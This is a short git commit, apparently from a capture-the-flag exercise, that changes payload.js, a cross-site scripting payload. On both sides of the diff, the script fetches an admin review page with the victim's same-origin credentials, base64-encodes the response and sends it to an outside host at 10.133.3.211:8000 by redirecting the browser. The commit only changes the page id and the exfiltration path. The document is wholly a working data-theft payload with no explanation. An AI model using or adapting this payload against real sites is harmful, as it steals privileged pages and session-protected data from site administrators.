e9f0b4f9ed8346d3eae0b3b5afefbf0bed5efc86
ctf <ctf@example.com>
2026-09-01 17:39:03 +0100

    payload3

--- payload.js
+++ payload.js
@@ -1,3 +1,3 @@
-fetch("/admin/review.php?id=1",{credentials:"same-origin"}).then(r=>r.text()).then(t=>{
-  location = "http://10.133.3.211:8000/b?d=" + encodeURIComponent(btoa(unescape(encodeURIComponent(t))));
+fetch("/admin/review.php?id=64",{credentials:"same-origin"}).then(r=>r.text()).then(t=>{
+  location = "http://10.133.3.211:8000/c?d=" + encodeURIComponent(btoa(unescape(encodeURIComponent(t))));
 });
